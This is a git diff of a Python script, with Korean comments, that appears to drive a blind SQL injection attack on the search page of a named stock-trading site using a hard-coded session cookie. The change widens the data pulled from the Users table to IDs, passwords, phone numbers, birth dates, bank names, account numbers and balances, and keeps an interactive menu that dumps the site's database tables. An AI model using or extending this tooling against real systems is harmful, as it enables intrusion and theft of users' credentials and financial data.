@@ -6,7 +6,7 @@ from get_infos import *
 #공격 대상 URL 및 초기 쿠키 설정 
 url = "https://www.rookiestock.com/search"
 cookies = {
-    "JSESSIONID":"201574BCB8517113C534D7F22982A392"
+    "JSESSIONID":"08A0E4467B33F693DBB9EBA3CC6D90D2"
 }
 
 
@@ -17,16 +17,14 @@ page.set_url(url)
 page.set_cookies(cookies)
 
 result = tableInfo()
+
 table_list=['Users','Board', 'Community', 'Notice', 'OrderStockHistory', 'Stock', 'StockHistory', 'Stock_Price', 'Transaction', 'Transfer_history', 'UserStock', 'file', 'notice', 'stock_index', 'user']
 for t in table_list:
     result.append_table(t)
 
-user_column_list = ['ACCESS_LEVEL']
-
-
+user_column_list = ['USER_ID','USER_PW','ACCESS_LEVEL','USER_NM','USER_AGENCY','USER_TELNO','USER_BIRTH','USER_BANK','USER_ACCOUNT_NUMBER','ACCOUNT_BALANCE']
 for c in user_column_list:
     result.append_column('Users',c)
-
 
 
 #쿼리 설정 및 요청 보내기(POST)
@@ -35,27 +33,6 @@ for c in user_column_list:
 #기본 설정 보기 
 #page.show
 
-#쿼리 테스트
-#table_count_query = query.get_table_query('count')
-#table_length_query = query.get_table_query('length',rnum=1)
-#table_data_query = query.get_table_query('data',rnum=1)
-
-#column_count_query = query.get_column_query('count',table_name='MEMBER')
-#column_length_query = query.get_column_query('length',table_name='ANSWER',rnum=1)
-#column_data_query = query.get_column_query('data',table_name='ANSWER',rnum=1)
-
-#data_count_query = query.get_data_query('count',table_name='ANSWER',column_name='ANSWER')
-#data_length_query = query.get_data_query('length',table_name='ANSWER',column_name='ANSWER',rnum=1)
-#data_query = query.get_data_query('data',table_name='ANSWER',column_name='ANSWER',rnum=1)
-
-#print(data_query)
-#binary_search(page,column_count_query)
-#letter_search(page,data_query,4)
-
-
-#tables = get_table_infos(page)
-#get_column_infos(page,result,'ANSWER')
-#get_table_data(page,result,'ANSWER')
 
 state=""
 while(state != 'q'):
@@ -170,7 +147,7 @@ while(state != 'q'):
         case 'get_db rookie':
             page.show()
             if input("\ncontinue? [y/n] : ")=='y':
-                tables = getData.get_tables(page)
+                result = getData.get_tables(page)
                 print("")
                 result.show_tables()
                 user_table = input("\ntable name? ")
